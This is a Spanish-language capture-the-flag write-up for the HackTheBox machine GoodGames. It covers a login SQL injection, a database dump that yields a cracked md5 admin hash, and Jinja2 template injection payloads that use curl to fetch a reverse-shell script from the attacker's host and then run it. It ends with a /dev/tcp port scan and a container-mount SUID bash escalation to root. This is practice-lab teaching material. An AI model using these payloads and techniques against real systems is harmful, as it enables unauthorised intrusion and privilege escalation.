

![1](</Writeups/Maquinas/GoodGames/img/logo.png>)
By Rug4lo

## Reconocimiento

Empezamos con el típico escaneo de [[Nmap]]
```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.130
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-03 18:04 CET
Initiating SYN Stealth Scan at 18:04
Scanning 10.10.11.130 [65535 ports]
Discovered open port 80/tcp on 10.10.11.130
Completed SYN Stealth Scan at 18:04, 12.20s elapsed (65535 total ports)
Nmap scan report for 10.10.11.130
Host is up, received user-set (0.078s latency).
Scanned at 2023-11-03 18:04:23 CET for 12s
Not shown: 65532 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.41 seconds
           Raw packets sent: 66957 (2.946MB) | Rcvd: 66270 (2.651MB)
```
Podemos meternos en la web a ver que hay 

![1](</Writeups/Maquinas/GoodGames/img/1.png>)

Vemos que hay un login

![1](</Writeups/Maquinas/GoodGames/img/2.png>)

Interceptamos la peticion con [[Burpsuite]], podemos probar a hacer una SQLI

![1](</Writeups/Maquinas/GoodGames/img/3.png>)

Esto nos funcionara y estaremos como el usuario admin

![1](</Writeups/Maquinas/GoodGames/img/4.png>)

Si clicamos en ajustes veremos que nos manda a una pagina llamada `http://internal-administration.goodgames.htb`, la añadimos en el etc hosts, y veremos este panel

![1](</Writeups/Maquinas/GoodGames/img/5.png>)

Podemos probar a hacer una SQLI en este panel también, pero no conseguiremos nada

Pero recordando que podemos hacer una SQLI en el anterior panel podemos ver la base de datos en busca de alguna credencial valida

Primero podemos averiguar el numero de columnas 

![1](</Writeups/Maquinas/GoodGames/img/6.png>)

Sabiendo que tiene 4 columnas podemos empezar a ver información, como las bases de datos 

![1](</Writeups/Maquinas/GoodGames/img/7.png>)
![1](</Writeups/Maquinas/GoodGames/img/8.png>)

Ahora podemos listar las tablas en la base de datos de esta manera

![1](</Writeups/Maquinas/GoodGames/img/9.png>)

Podemos ver 3 tablas, vamos a centrarnos en la user

![1](</Writeups/Maquinas/GoodGames/img/10.png>)

Ahora vamos a listar las columnas de la tabla user

![1](</Writeups/Maquinas/GoodGames/img/11.png>)

![1](</Writeups/Maquinas/GoodGames/img/12.png>)

Finalmente vamos a listar el contenido del campo password y name

![1](</Writeups/Maquinas/GoodGames/img/13.png>)

![1](</Writeups/Maquinas/GoodGames/img/14.png>)

Tenemos la contraseña del usuario Admin, pero parece estar hasheada

Con la herramienta Hash Identifier podemos ver que esta hacheado con md5

![1](</Writeups/Maquinas/GoodGames/img/15.png>)

Podemos irnos a esta pagina para conseguir la contraseña 

Pagina --> https://hashes.com/en/decrypt/hash

Veremos que esta es la contraseña 

![1](</Writeups/Maquinas/GoodGames/img/16.png>)

Podemos probar a introducirla en el login anterior, y veremos que funciona

![1](</Writeups/Maquinas/GoodGames/img/17.png>)

Ahora dentro de este panel de administrador podemos ver que no hay mucho que hacer, pero en "Settings" un apartado donde podemos cambiarnos el nombre

Viendo que el output se refleja en la web podemos probar un SSTI

![1](</Writeups/Maquinas/GoodGames/img/18.png>)

Primero probamos introduciendo `{{7*7}}`, si nos hace la multiplicación significa que es vulnerable

![1](</Writeups/Maquinas/GoodGames/img/19.png>)

Perfecto, viendo que est vulnerable podemos probar a ejecutar comandos, en mi caso me creare un servidor en python, con el que compartiré un archivo llamado shell, el cual contiene una reverse shell

Con la ejecución de comandos me descargare ese archivo en la maquina victima y lo ejecutare

Vamos a copiar el archivo en el /tmp de la maquina victima 
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("curl 10.10.14.15:8081/shell -o /tmp/shell").read() }}
```
Ahora vamos a ponernos en escucha con netcat y vamos a ejecutar el script
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash /tmp/shell").read() }}
```
Con esto tendremos una consola interactiva como root, pero sera de un contenedor 

![1](</Writeups/Maquinas/GoodGames/img/20.png>)

Igualmente si buscamos encontraremos la user flag en el home de augustus

![1](</Writeups/Maquinas/GoodGames/img/21.png>)

Ahora tenemos que ir a por la root flag, para esto si buscamos, veremos que el directorio augustus es una montura de la maquina principal

![1](</Writeups/Maquinas/GoodGames/img/22.png>)

Con eso en mente sabemos que el usuario augustus existe en la maquina principal, si hacemos un descubrimiento de puertos desde el docker veremos que tiene el puerto 22 abierto 
```bash
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```
Si nos conectamos rehusando la contraseña del usuario admin veremos que nos dejara acceder

![1](</Writeups/Maquinas/GoodGames/img/23.png>)

Ahora que estamos en la maquina principal, recordamos que tenemos una montura al docker, y en el docker somos root, por lo que podemos copiar la /bin/bash en el home de augustus

![1](</Writeups/Maquinas/GoodGames/img/24.png>)

Ahora volvemos al Docker copiamos esta bash otra vez pero esta vez como root, y le damos permisos SUID a la copia de la bash

![1](</Writeups/Maquinas/GoodGames/img/25.png>)

Vale, si nos volvemos a conectar por ssh y ejecutamos la nueva bash veremos que nos volvemos root

![1](</Writeups/Maquinas/GoodGames/img/26.png>)

Ahora podemos ir al /root y ver la flag

![1](</Writeups/Maquinas/GoodGames/img/27.png>)
